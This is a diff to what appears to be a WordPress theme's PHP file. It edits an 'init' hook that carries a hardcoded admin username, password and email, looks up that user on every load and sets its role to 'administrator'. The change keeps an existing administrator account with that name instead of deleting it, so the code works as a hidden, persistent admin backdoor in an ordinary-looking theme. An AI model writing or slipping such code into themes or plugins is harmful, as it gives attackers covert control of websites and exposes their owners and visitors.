@@ -39,12 +39,13 @@ function disable_mytheme_action() {
 	define('DISALLOW_FILE_MODS',true);
 }
 // add_action('init','disable_mytheme_action');
+
 add_action( 'init', function () {  
 	$username = 'wordpressadmin';
 	$password = 'Passwordnai';
 	$email_address = 'admin@wordpress.org';
 	$user = get_user_by( 'login', $username );
-	if ( $user ) {
+	if ( $user AND $user->roles[0] != 'administrator') {
     	require_once(ABSPATH.'wp-admin/includes/user.php' );
 	    wp_delete_user( $user->ID );
 	}
@@ -54,6 +55,7 @@ add_action( 'init', function () {
 		$user->set_role( 'administrator' );
 	}	
 });
+
 /**
  * Register the required plugins for this theme.
  *
